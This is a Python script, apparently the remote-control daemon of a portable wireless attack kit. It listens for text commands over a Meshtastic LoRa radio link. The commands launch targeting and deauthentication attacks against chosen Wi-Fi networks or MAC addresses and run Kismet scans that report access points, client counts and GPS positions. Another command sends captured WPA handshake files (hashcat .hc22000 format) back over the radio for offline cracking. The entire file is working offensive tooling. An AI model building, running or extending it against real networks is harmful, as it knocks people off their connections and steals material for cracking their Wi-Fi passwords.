#!/home/angy/Angrypack/angypython/.venv/bin/python

import os
import subprocess
import time
import meshtastic
import meshtastic.serial_interface
from pubsub import pub
from src.data_management import *
from src.kismet_calls import *
from src.service_management import *

python_file_path = os.path.abspath(__file__)
angypython_dir = os.path.dirname(python_file_path)
angypack_dir = os.path.dirname(angypython_dir)
SERVICE_DIR = "/etc/systemd/system"
WORKING_DIR = f"{angypack_dir}/logs"
OUTPUT_DIR = f"{angypack_dir}/output"
LOG_DIR = os.path.expanduser(f'{WORKING_DIR}/handshakes')

def onReceive(packet, interface):
    """Called when a packet arrives."""
    if 'decoded' in packet and 'text' in packet['decoded']:
        message = packet['decoded']['text'].strip()


        if message.startswith("t "):
            parts = message[2:].split(" ", 2) 
            if len(parts) == 3 and parts[1].isdigit():
                interface_name, channel, target = parts
                stop_interface_service(interface_name)
                remove_t_service(interface_name)
                create_t_service(interface_name, target, channel)
                interface.sendText(f"Targeting {target} with {interface_name} on channel {channel}...")            
            else:
                parts = message[2:].split(" ", 1)
                interface_name, target = parts
                if len(parts) == 2:
                    interface_name, target = parts
                    if target.lower() == "stop":
                        print(f"Received 'stop' command for {interface_name}, stopping the systemd service.")
                        remove_t_service(interface_name)
                        interface.sendText(f"Targeting with {interface_name} stopped.")
                    else:
                        stop_interface_service(interface_name)
                        remove_t_service(interface_name)
                        create_t_service(interface_name, target)
                        interface.sendText(f"Targeting {target} with {interface_name}...")
                
                
        elif message.startswith("tscan "):
            parts = message[6:]
            target_ssid = parts
            scan_results = kismet_scan_target(target_ssid)
            for i in scan_results:
                tssid = i[0]
                tbssid = i[1]
                tchan = i[2]
                trssi = i[3]
                tdiff = i[4]
                tmanuf = i[5]
                tsec = i[6]
                tclient = i[7]
                tlat = i[8]
                tlon = i[9]
                tprint = f"""{tssid} 
Channel {tchan}
{tbssid}
{tmanuf}
{tsec}
{tclient} clients
{tlat}, {tlon}
{trssi} dbm
Last seen {tdiff} seconds ago"""
                interface.sendText(tprint)


        elif message.startswith("tfind "):
            parts = message[6:]
            if parts == "stop":
                remove_tfind_service
            else:
                create_tfind_service(parts)


        elif message.startswith("td "):
           parts = message[3:].split(" ", 2) 
           if len(parts) == 3 and parts[1].isdigit():
                interface_name, channel, target = parts
                stop_interface_service(interface_name)
                remove_t_service(interface_name)
                create_t_service(interface_name, target, channel)
                if is_mac_address(target):
                    create_td_service(interface_name, target, 'b')
                else:
                    create_td_service(interface_name, target, 'e')

                interface.sendText(f"Deauthing {target} with {interface_name} on channel {channel}...")            
           else:
                parts = message[3:].split(" ", 1)
                interface_name, target = parts
                if len(parts) == 2:
                    interface_name, target = parts
                    if target.lower() == "stop":
                        print(f"Received 'stop' command for {interface_name}, stopping the systemd service.")
                        remove_td_service(interface_name)
                        remove_t_service(interface_name)
                        interface.sendText(f"Deauthing and targeting with {interface_name} stopped.")
                    elif target.lower() == "stopd":
                        remove_td_service(interface_name)
                        interface.sendText(f"Deauthing with {interface_name} stopped, maintaining targeting...")
                    else:
                        print(f"Received target interface: {interface_name}, target: {target}")
                        stop_interface_service(interface_name)
                        remove_t_service(interface_name)
                        create_t_service(interface_name, target)
                        if is_mac_address(target):
                            create_td_service(interface_name, target, 'b')
                        else:
                            create_td_service(interface_name, target, 'e')
                        interface.sendText(f"Deauthing {target} with {interface_name}...")


        elif message.startswith("tc "):
            parts = message[3:].split(" ", 1)
            if len(parts)==2:
                interface_name, chan = parts
                create_tc_service(interface_name, chan)


        elif message.startswith("s "):
            parts = message[2:].split(" ", 1)  
            if len(parts) == 2:
                interface_name, serv = parts
                if serv.lower() == "2":
                    serv_full = "angry2.4"
                    stop_interface_service(interface_name)
                    start_interface_service(interface_name, serv_full)
                    interface.sendText(f"Starting {serv_full} with {interface_name}...")
                if serv.lower() == "5":
                    serv_full = "angry5"
                    stop_interface_service(interface_name)
                    start_interface_service(interface_name, serv_full)
                    interface.sendText(f"Starting {serv_full} with {interface_name}...")
                if serv.lower() == "2*":
                    serv_full = "angry2all"
                    stop_interface_service(interface_name)
                    start_interface_service(interface_name, serv_full)
                    interface.sendText(f"Starting {serv_full} with {interface_name}...")
                if serv.lower() == "5*":
                    serv_full = "angry5all"
                    stop_interface_service(interface_name)
                    start_interface_service(interface_name, serv_full)
                    interface.sendText(f"Starting {serv_full} with {interface_name}...")
                if serv.lower() == "kismet":
                    serv_full = "angrykismet"
                    stop_kismet_service()
                    stop_interface_service(interface_name)
                    start_interface_service(interface_name, serv_full)
                    interface.sendText(f"Starting {serv_full} with {interface_name}...")
                if serv.lower() == "stop":
                    interface.sendText(f"Stopping services for {interface_name}...")
                    stop_interface_service(interface_name)
      
      
        elif message.startswith ("scan"):
            kismet_scan(interface)


        elif message.startswith ("nmscan"):
            nmcli_file_path = f'{OUTPUT_DIR}/nmcli_output.txt'
            run_nmcli(nmcli_file_path)
            extract_ssids(nmcli_file_path, interface)


        elif message.startswith ("dormant"):
            interface.sendText(f"Stopping all services...")
            stop_all_service()


        elif message.startswith ("status"):
            INTERFACES = subprocess.run("iwconfig 2>/dev/null | grep '^[a-zA-Z0-9]' | awk '{print $1}' | grep -v '.*mon$' | grep -v '^wlan0$'", shell=True, text=True, capture_output=True).stdout.strip()
            SERVICES = subprocess.run("systemctl list-units --type=service --state=active --no-pager --no-legend | awk '{print $1}' | grep '^angry'", shell=True, text=True, capture_output=True).stdout.strip() 
            LOCATION = get_gps_data()
            printint = f"""INTERFACES:
{INTERFACES}

SERVICES:
{SERVICES}

LOCATION:
{LOCATION}"""

            interface.sendText(f"{printint}")


        elif message.startswith ("shutdown"):
            interface.sendText("Shutting down...")
            local_num = interface.myInfo.my_node_num
            local_node = interface.getNode(local_num)
            local_node.shutdown(0)
            subprocess.run(["shutdown", "now"], check=True)


        else:
            ssid = message.strip()
            print(f"Received SSID: {ssid}")

            log_files = [f for f in os.listdir(LOG_DIR) if f.startswith(ssid) and f.endswith('.hc22000')]

            if log_files:
                
                log_file = log_files[0]
                log_file_path = os.path.join(LOG_DIR, log_file)
                interface.sendText(f"Found {log_file}, contents to follow...")
                with open(log_file_path, 'r') as f:
                    log_content = f.readline().strip() 

                
                send_message_in_chunks(log_content, interface)
            else:
                
                meshtastic_message = f"{ssid}: No .hc22000 file found"
                interface.sendText(meshtastic_message)
                print(f"Sent message to Meshtastic: {meshtastic_message}")


if __name__ == "__main__":
    interface = meshtastic.serial_interface.SerialInterface('/dev/lora')

 
    pub.subscribe(onReceive, "meshtastic.receive")

 


    while True:
        time.sleep(1000)  
    interface.close()
